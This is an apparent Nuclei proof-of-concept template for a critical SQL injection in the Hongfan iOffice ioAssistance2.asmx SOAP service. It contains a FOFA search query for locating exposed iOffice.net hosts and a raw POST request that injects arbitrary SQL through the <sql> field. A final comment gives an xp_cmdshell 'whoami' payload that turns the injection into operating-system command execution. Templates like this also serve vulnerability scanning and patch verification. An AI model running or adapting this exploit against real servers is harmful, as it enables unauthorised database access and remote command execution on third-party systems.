poc/sql/hongfan-ioffice-ioassistance2-sqli.yaml

id: hongfan-ioffice-ioassistance2-sqli

info:
  name: hongfan-ioffice-ioassistance2-sqli
  author: yy
  severity: critical
  description: 红帆 ioffice ioassistance2.asmx存在sql注入漏洞。
  tags: hongfan,sqli
  metadata:
    fofa-query : title="iOffice.net"

http:
  - raw: 
      - |
        POST /ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
        Host: 
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/GetLoginedEmpNoReadedInf"
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001
        /XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
         <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
         <sql>select 1111123</sql>
         </GetLoginedEmpNoReadedInf>
         </soap:Body>
        </soap:Envelope>

    matchers-condition: and        
    matchers:
      - type: word
        words:
          - "1111123"
          - "?xml"
        condition: and

      - type: status
        status:
          - 200          
          
#利用：exec master.dbo.xp_cmdshell 'whoami'